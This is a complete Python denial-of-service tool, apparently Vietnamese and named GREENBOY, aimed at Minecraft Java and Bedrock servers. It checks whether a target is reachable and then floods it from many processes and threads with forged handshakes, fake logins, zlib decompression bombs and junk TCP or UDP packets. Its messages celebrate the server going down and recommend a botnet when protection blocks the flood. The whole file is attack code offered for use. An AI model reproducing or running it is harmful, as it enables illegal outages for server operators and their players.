#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║  GREENBOY - TEST CONNECTION TRƯỚC KHI PHÁ                  ║
# ║  TỰ ĐỘNG KIỂM TRA KẾT NỐI - HIỂN THỊ LỖI CHI TIẾT         ║
# ╚══════════════════════════════════════════════════════════════╝
import socket, threading, time, sys, random, struct, os, multiprocessing, re, zlib

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (4194304, 4194304))
    resource.setrlimit(resource.RLIMIT_NPROC, (4194304, 4194304))
except: pass

try:
    os.system('sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null')
    os.system('sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null')
except: pass

attack_flag = True
stats = {'sent': 0, 'failed': 0, 'bytes': 0, 'errors': {}}
stats_lock = threading.Lock()

JAVA_PROTOCOLS = [767,767,767,767,767, 766,765,764,763,762,761,760,759,758,757,756,755,754,753,751,736,735,578,575,573,498,490,485,480,477,404,401,393,340,338,335,316,315,210,110,109,107,47,5,4]
BEDROCK_PROTOCOLS = [686,685,680,671,662,630,622,594,589,582,575,560,554,544,534,527,503,486,475,471,465,448,440,431,422,419,408,407,390,389,388,361,354,340,332,313,291,282,274]

class C:
    G='\033[92m'; R='\033[91m'; Y='\033[93m'; C='\033[96m'; M='\033[95m'; W='\033[97m'; B='\033[1m'; X='\033[0m'

def banner():
    print(f"""{C.G}{C.B}
   ██████╗ ██████╗ ███████╗███████╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║██████╔╝██║   ██║ ╚████╔╝ 
  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║██╔══██╗██║   ██║  ╚██╔╝  
  ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║██████╔╝╚██████╔╝   ██║   
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝    ╚═╝   
{C.X}
{C.R}  ╔═══════════════════════════════════════════════════════╗
  ║     ☢ GREENBOY - TEST & DESTROY ☢                      ║
  ║     {C.W}TỰ ĐỘNG TEST KẾT NỐI TRƯỚC KHI PHÁ{C.R}                    ║
  ╚═══════════════════════════════════════════════════════╝{C.X}
""")

def clean(text, dot=False):
    text = text.strip().replace(' ','').replace('\t','').replace('\n','').replace('\r','')
    text = text.replace('\u200b','').replace('\u200c','').replace('\u200d','').replace('\ufeff','').replace('\u00a0','')
    return re.sub(r'[^a-zA-Z0-9\.\-]', '', text) if dot else re.sub(r'[^0-9]', '', text)

def mkvar(v):
    if v < 128: return bytes([v])
    r = bytearray()
    while True:
        b = v & 0x7F; v >>= 7
        if v != 0: b |= 0x80
        r.append(b)
        if v == 0: break
    return bytes(r)

def mkstr(t): return mkvar(len(e:=t.encode())) + e

# ============================================================
# TEST KẾT NỐI CHI TIẾT
# ============================================================
def test_connection(host, port, server_type='java'):
    """KIỂM TRA CHI TIẾT KẾT NỐI ĐẾN SERVER MINECRAFT"""
    print(f"\n{C.C}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.C}║         {C.Y}ĐANG TEST KẾT NỐI ĐẾN {host}:{port}{C.C}              ║")
    print(f"{C.C}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    results = {}
    
    # TEST 1: PING
    print(f"{C.W}[TEST 1] Ping...{C.X}", end=' ')
    try:
        ping_time = 0
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        ping_time = (time.time() - start) * 1000
        sock.close()
        print(f"{C.G}[✓] {ping_time:.0f}ms - Port MỞ!{C.X}")
        results['ping'] = True
    except socket.timeout:
        print(f"{C.R}[✗] TIMEOUT - Server không phản hồi{C.X}")
        results['ping'] = False
    except ConnectionRefusedError:
        print(f"{C.R}[✗] CONNECTION REFUSED - Sai port hoặc server tắt{C.X}")
        results['ping'] = False
    except Exception as e:
        print(f"{C.R}[✗] LỖI: {str(e)[:80]}{C.X}")
        results['ping'] = False
    
    if not results.get('ping'):
        print(f"\n{C.R}╔═══════════════════════════════════════════════════════╗{C.X}")
        print(f"{C.R}║  KHÔNG THỂ KẾT NỐI ĐẾN SERVER!                       ║{C.X}")
        print(f"{C.R}║  Nguyên nhân có thể:                                  ║{C.X}")
        print(f"{C.R}║  - Sai IP hoặc PORT                                   ║{C.X}")
        print(f"{C.R}║  - Server tắt                                         ║{C.X}")
        print(f"{C.R}║  - Tường lửa chặn IP của bạn                          ║{C.X}")
        print(f"{C.R}║  - TCP Shield/Cloudflare đang bảo vệ                  ║{C.X}")
        print(f"{C.R}╚═══════════════════════════════════════════════════════╝{C.X}\n")
        return False
    
    # TEST 2: MINECRAFT HANDSHAKE
    print(f"{C.W}[TEST 2] Gửi Minecraft Handshake...{C.X}", end=' ')
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # TẠO HANDSHAKE PACKET CHUẨN
        host_bytes = mkstr(host)
        port_bytes = struct.pack('>H', port)
        proto = 767  # 1.21.1
        inner = b'\x00' + mkvar(proto) + host_bytes + port_bytes + b'\x01'
        handshake = mkvar(len(inner)) + inner
        
        # STATUS REQUEST
        status_req = b'\x01\x00'
        
        sock.send(handshake + status_req)
        
        # ĐỌC PHẢN HỒI
        sock.settimeout(3)
        data = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
                if len(data) > 100: break
            except: break
        sock.close()
        
        if data and len(data) > 5:
            print(f"{C.G}[✓] Server phản hồi {len(data)} bytes - MINECRAFT THẬT!{C.X}")
            results['minecraft'] = True
        else:
            print(f"{C.Y}[?] Server trả lời {len(data)} bytes - Có thể là TCP Shield{C.X}")
            results['minecraft'] = False
    except Exception as e:
        print(f"{C.R}[✗] LỖI: {str(e)[:80]}{C.X}")
        results['minecraft'] = False
    
    # TEST 3: GỬI NHIỀU GÓI NHANH
    print(f"{C.W}[TEST 3] Gửi 10 gói nhanh...{C.X}", end=' ')
    sent = 0
    for _ in range(10):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, port))
            sock.send(handshake + status_req)
            sock.close()
            sent += 1
        except: pass
    if sent == 10:
        print(f"{C.G}[✓] 10/10 gói thành công!{C.X}")
        results['flood'] = True
    elif sent > 0:
        print(f"{C.Y}[?] {sent}/10 gói - Có thể bị rate limit{C.X}")
        results['flood'] = sent
    else:
        print(f"{C.R}[✗] 0/10 - Bị chặn hoàn toàn{C.X}")
        results['flood'] = 0
    
    # TEST 4: UDP (CHO BEDROCK)
    if server_type == 'bedrock':
        print(f"{C.W}[TEST 4] UDP Ping Bedrock...{C.X}", end=' ')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            ping = b'\x01' + struct.pack('>Q', int(time.time()*1000)) + b'\x00'*16 + b'\x00'*8
            sock.sendto(ping, (host, port))
            data, _ = sock.recvfrom(4096)
            sock.close()
            if data:
                print(f"{C.G}[✓] Bedrock phản hồi {len(data)} bytes!{C.X}")
                results['bedrock'] = True
            else:
                print(f"{C.Y}[?] Không phản hồi UDP{C.X}")
                results['bedrock'] = False
        except Exception as e:
            print(f"{C.R}[✗] LỖI: {str(e)[:80]}{C.X}")
            results['bedrock'] = False
    
    # TỔNG KẾT
    print(f"\n{C.C}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.C}║              {C.Y}KẾT QUẢ TEST{C.C}                                ║")
    print(f"{C.C}╠═══════════════════════════════════════════════════════╣{C.X}")
    
    all_ok = True
    if results.get('ping'):
        print(f"{C.C}║ {C.G}[✓] Kết nối TCP thành công{C.C}                          ║")
    else:
        print(f"{C.C}║ {C.R}[✗] Kết nối TCP thất bại{C.C}                            ║")
        all_ok = False
    
    if results.get('minecraft'):
        print(f"{C.C}║ {C.G}[✓] Server Minecraft xác nhận{C.C}                       ║")
    else:
        print(f"{C.C}║ {C.R}[✗] Có thể có TCP Shield / Proxy{C.C}                   ║")
        all_ok = False
    
    if results.get('flood') == True:
        print(f"{C.C}║ {C.G}[✓] Gửi gói nhanh OK{C.C}                                 ║")
    elif results.get('flood', 0) > 0:
        print(f"{C.C}║ {C.Y}[?] Gửi được {results['flood']}/10 - Rate Limit{C.C}                    ║")
        all_ok = False
    else:
        print(f"{C.C}║ {C.R}[✗] KHÔNG GỬI ĐƯỢC GÓI NÀO - BỊ CHẶN{C.C}                ║")
        all_ok = False
    
    print(f"{C.C}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    if all_ok:
        print(f"{C.G}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
        print(f"{C.G}{C.B}║  [✓] TẤT CẢ TEST ĐẠT - CÓ THỂ PHÁ ĐƯỢC!              ║{C.X}")
        print(f"{C.G}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    else:
        print(f"{C.R}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
        print(f"{C.R}{C.B}║  [✗] CÓ VẤN ĐỀ - SERVER ĐƯỢC BẢO VỆ MẠNH             ║{C.X}")
        print(f"{C.R}{C.B}║  [✗] KHÔNG THỂ PHÁ NẾU KHÔNG QUA ĐƯỢC BẢO VỆ         ║{C.X}")
        print(f"{C.R}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    return all_ok

# ============================================================
# PACKET CACHE & WORKERS (GIỮ NGUYÊN)
# ============================================================
class JavaPacketCache:
    def __init__(s, h, p):
        s.host=h; s.port=p; s.hs=mkstr(h); s.pb=struct.pack('>H', p)
        s.c={}
        for pr in set(JAVA_PROTOCOLS):
            i=b'\x00'+mkvar(pr)+s.hs+s.pb
            s.c[f's_{pr}']=mkvar(len(i)+1)+i+b'\x01'
            s.c[f'l_{pr}']=mkvar(len(i)+1)+i+b'\x02'
        s.c['sr']=b'\x01\x00'
        s.bombs=[struct.pack('>i',sz)+zlib.compress(b'\x00'*sz,level=1) for sz in [50000,100000,150000,200000]]
        s.junks=[b'\x00'*sz for sz in [100,500,1000,2000,5000,10000,20000]]
    def gjs(s): pr=random.choice(JAVA_PROTOCOLS); return s.c.get(f's_{pr}',s.c[f's_{767}'])+b'\x00'*random.randint(0,200)
    def gjl(s): pr=random.choice(JAVA_PROTOCOLS); return s.c.get(f'l_{pr}',s.c[f'l_{767}'])+b'\x00'*random.randint(0,100)
    def gjsr(s): return s.c['sr']
    def gjlp(s): nl=random.randint(3,30); n=f"GB{random.randint(0,99999999):08d}"+''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789_') for _ in range(nl)); return mkvar(len(n)+1)+b'\x00'+mkstr(n)
    def gbomb(s): return random.choice(s.bombs)
    def gjunk(s): return random.choice(s.junks)

class BedrockPacketCache:
    def __init__(s, h, p):
        s.host=h; s.port=p; s.c={}
        for pr in BEDROCK_PROTOCOLS:
            ping=b'\x01'+struct.pack('>Q',random.randint(0,2**63-1))+b'\x00'*16+b'\x00'*8
            s.c[f'ping_{pr}']=ping
            oq=b'\x05'+b'\x00'*16+struct.pack('B',pr%256)+b'\x00'*random.randint(100,1400)
            s.c[f'oq_{pr}']=oq
    def gbp(s): pr=random.choice(BEDROCK_PROTOCOLS); return s.c.get(f'ping_{pr}',s.c[f'ping_{BEDROCK_PROTOCOLS[0]}'])
    def gboq(s): pr=random.choice(BEDROCK_PROTOCOLS); return s.c.get(f'oq_{pr}',s.c[f'oq_{BEDROCK_PROTOCOLS[0]}'])

class JavaWorker:
    def __init__(s,h,p,d,pc): s.host=h; s.port=p; s.e=time.time()+d; s.pc=pc; s.addr=(h,p)
    def run(s):
        global attack_flag, stats
        while time.time()<s.e and attack_flag:
            b=0; bt=0
            for _ in range(500):
                if time.time()>=s.e or not attack_flag: break
                try:
                    sk=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sk.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
                    sk.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,131072)
                    sk.settimeout(0.02)
                    sk.connect(s.addr)
                    r=random.random()
                    if r<0.25: sk.sendall(s.pc.gjs()+s.pc.gjsr())
                    elif r<0.45: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp())
                    elif r<0.55: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp()); sk.sendall(s.pc.gbomb())
                    elif r<0.65: sk.sendall(s.pc.gjs()+s.pc.gjsr()); sk.sendall(s.pc.gjunk())
                    elif r<0.80: sk.sendall(s.pc.gjl()); sk.sendall(s.pc.gjlp()); [sk.sendall(s.pc.gjunk()) for _ in range(random.randint(1,5))]
                    else: sk.sendall(s.pc.gjs()+s.pc.gjsr()); sk.sendall(s.pc.gbomb()); sk.sendall(s.pc.gjunk())
                    sk.close(); b+=1; bt+=random.randint(100,10000)
                except Exception as e:
                    err = str(e)[:30]
                    with stats_lock:
                        stats['failed'] += 1
                        stats['errors'][err] = stats['errors'].get(err, 0) + 1
            with stats_lock: stats['sent']+=b; stats['bytes']+=bt

class BedrockWorker:
    def __init__(s,h,p,d,pc): s.host=h; s.port=p; s.e=time.time()+d; s.pc=pc
    def run(s):
        global attack_flag, stats
        while time.time()<s.e and attack_flag:
            b=0; bt=0
            for _ in range(500):
                if time.time()>=s.e or not attack_flag: break
                try:
                    sk=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                    sk.settimeout(0.01)
                    sk.sendto(s.pc.gbp(),(s.host,s.port))
                    sk.sendto(s.pc.gboq(),(s.host,s.port))
                    sk.close(); b+=2; bt+=300
                except: pass
            with stats_lock: stats['sent']+=b; stats['bytes']+=bt

def java_launch(h,p,d,pc,wc):
    ws=[threading.Thread(target=JavaWorker(h,p,d,pc).run) for _ in range(wc)]
    for t in ws: t.daemon=True; t.start()
    for t in ws: t.join(timeout=1)

def bedrock_launch(h,p,d,pc,wc):
    ws=[threading.Thread(target=BedrockWorker(h,p,d,pc).run) for _ in range(wc)]
    for t in ws: t.daemon=True; t.start()
    for t in ws: t.join(timeout=1)

def main():
    global attack_flag, stats
    banner()
    
    while True:
        h=clean(input(f"{C.W}[?] IP: {C.G}"),dot=True)
        if h and len(h)>=3: break
        print(f"{C.R}[!] Nhập lại!{C.X}")
    try:
        rip=socket.gethostbyname(h)
        if rip!=h: print(f"{C.G}[✓] {h} → {rip}{C.X}")
    except: print(f"{C.R}[!] Không phân giải được!{C.X}"); sys.exit(1)
    
    while True:
        pi=clean(input(f"{C.W}[?] PORT: {C.G}"))
        if pi=='':
            print(f"{C.R}[!] Phải nhập port!{C.X}")
            continue
        try:
            port=int(pi)
            if 1<=port<=65535: break
            print(f"{C.R}[!] 1-65535!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    print(f"\n{C.C}1. JAVA (PC)  2. BEDROCK (PE){C.X}")
    while True:
        st=clean(input(f"{C.W}[?] LOẠI: {C.G}"))
        if st in ['1','2']: srv_type=int(st); break
        print(f"{C.R}[!] 1 hoặc 2!{C.X}")
    
    # ============ TEST KẾT NỐI TRƯỚC ============
    server_type = 'java' if srv_type == 1 else 'bedrock'
    can_attack = test_connection(h, port, server_type)
    
    if not can_attack:
        choice = input(f"{C.Y}[?] Kết nối có vấn đề. Vẫn muốn thử phá? (y/n): {C.G}").strip().lower()
        if choice != 'y':
            print(f"{C.Y}HỦY!{C.X}")
            sys.exit(0)
        print(f"{C.Y}[!] Sẽ cố gắng phá dù kết nối yếu...{C.X}\n")
    
    while True:
        try:
            bc=int(clean(input(f"{C.W}[?] BOT: {C.G}")))
            if bc>0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    while True:
        try:
            dr=int(clean(input(f"{C.W}[?] GIÂY: {C.G}")))
            if dr>0: break
            print(f"{C.R}[!] >0!{C.X}")
        except: print(f"{C.R}[!] Số!{C.X}")
    
    pn={1:'JAVA (PC)',2:'BEDROCK (PE)'}
    print(f"\n{C.R}╔════════════════════════╗{C.X}")
    print(f"{C.R}║ {C.W}{h}:{port} | {pn[srv_type]}{C.X}{C.R} ║")
    print(f"{C.R}║ {C.W}BOT:{bc} | GIÂY:{dr}{C.X}{C.R}        ║")
    print(f"{C.R}╚════════════════════════╝{C.X}\n")
    
    if input(f"{C.R}{C.B}[☢] GÕ 'PHÁ': {C.G}").strip().upper()!='PHÁ': print(f"{C.Y}HỦY!{C.X}"); sys.exit(0)
    
    print(f"\n{C.R}{C.B}⚡ GREENBOY ĐANG PHÁ... ⚡{C.X}\n")
    print(f"{C.C}[*] Nếu vẫn 0 gói sau 5 giây: server có TCP Shield - KHÔNG THỂ PHÁ{C.X}\n")
    
    cpu=multiprocessing.cpu_count()
    np=min(cpu*8,bc//10) if bc>10 else 1
    if np<1: np=1
    wpp=bc//np
    
    st=time.time(); ps=[]
    
    if srv_type==1:
        pc=JavaPacketCache(h,port)
        for _ in range(np):
            pr=multiprocessing.Process(target=java_launch,args=(h,port,dr,pc,wpp))
            pr.daemon=True; ps.append(pr); pr.start()
    else:
        pc=BedrockPacketCache(h,port)
        for _ in range(np):
            pr=multiprocessing.Process(target=bedrock_launch,args=(h,port,dr,pc,wpp))
            pr.daemon=True; ps.append(pr); pr.start()
    
    try:
        ls=0
        while time.time()-st<dr and attack_flag:
            time.sleep(1); el=time.time()-st
            with stats_lock:
                se=stats['sent']; fa=stats['failed']; mb=stats['bytes']/1024/1024
                errs = dict(stats['errors'])
            cr=se-ls; ls=se
            bl=min(60,int(cr/2000))
            bar='█'*bl+'░'*(60-bl)
            print(f"\r{C.R}[{el:.0f}s]{C.X} {C.Y}[{bar}]{C.X} {C.G}{se:,}{C.X} | {C.R}{fa:,}{C.X} | {C.M}{cr:,}{C.X}/s | {C.C}{mb:.1f}MB   ",end='')
            
            # HIỂN THỊ LỖI SAU 5 GIÂY NẾU 0 GÓI
            if el >= 5 and se == 0:
                print(f"\n\n{C.R}╔═══════════════════════════════════════════════════════╗{C.X}")
                print(f"{C.R}║  ☢ 0 GÓI ĐƯỢC GỬI!                                  ║{C.X}")
                print(f"{C.R}║  LỖI CHI TIẾT:                                       ║{C.X}")
                for err, count in sorted(errs.items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"{C.R}║  - {err}: {count} lần{C.X}")
                print(f"{C.R}║                                                      ║{C.X}")
                print(f"{C.R}║  KẾT LUẬN: SERVER CÓ TCP SHIELD / CLOUDFLARE        ║{C.X}")
                print(f"{C.R}║  KHÔNG THỂ PHÁ TỪ 1 VPS. CẦN BOTNET.                ║{C.X}")
                print(f"{C.R}╚═══════════════════════════════════════════════════════╝{C.X}\n")
                attack_flag = False
                break
                
    except KeyboardInterrupt: print(f"\n{C.Y}DỪNG!{C.X}"); attack_flag=False
    
    attack_flag=False
    for pr in ps: pr.join(timeout=3)
    for pr in ps:
        if pr.is_alive(): pr.terminate()
    
    el=time.time()-st; fr=stats['sent']/el if el>0 else 0
    
    print(f"\n\n{C.R}{C.B}╔════════════════════════╗{C.X}")
    print(f"{C.R}{C.B}║ GREENBOY - KẾT THÚC  ║")
    print(f"{C.R}{C.B}║ GÓI: {stats['sent']:,}{C.X}{C.R}        ║")
    print(f"{C.R}{C.B}║ LỖI: {stats['failed']:,}{C.X}{C.R}       ║")
    print(f"{C.R}{C.B}║ TỐC ĐỘ: {fr:,.0f}/s{C.X}{C.R}   ║")
    print(f"{C.R}{C.B}╚════════════════════════╝{C.X}\n")
    
    if stats['sent'] == 0:
        print(f"{C.R}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
        print(f"{C.R}{C.B}║  SERVER CÓ TCP SHIELD - KHÔNG THỂ PHÁ               ║{C.X}")
        print(f"{C.R}{C.B}║  CẦN BOTNET HOẶC KHAI THÁC LỖ HỔNG KHÁC             ║{C.X}")
        print(f"{C.R}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    elif fr>=50000: print(f"{C.R}{C.B}☢☢☢ SERVER BAY MÀU! ☢☢☢{C.X}\n")
    elif fr>=10000: print(f"{C.G}{C.B}☢ SERVER ĐÃ SẬP! ☢{C.X}\n")
    else: print(f"{C.Y}Tốc độ thấp - cần VPS mạnh hơn hoặc nhiều BOT hơn{C.X}\n")

if __name__=="__main__":
    try: os.nice(-20)
    except: pass
    main()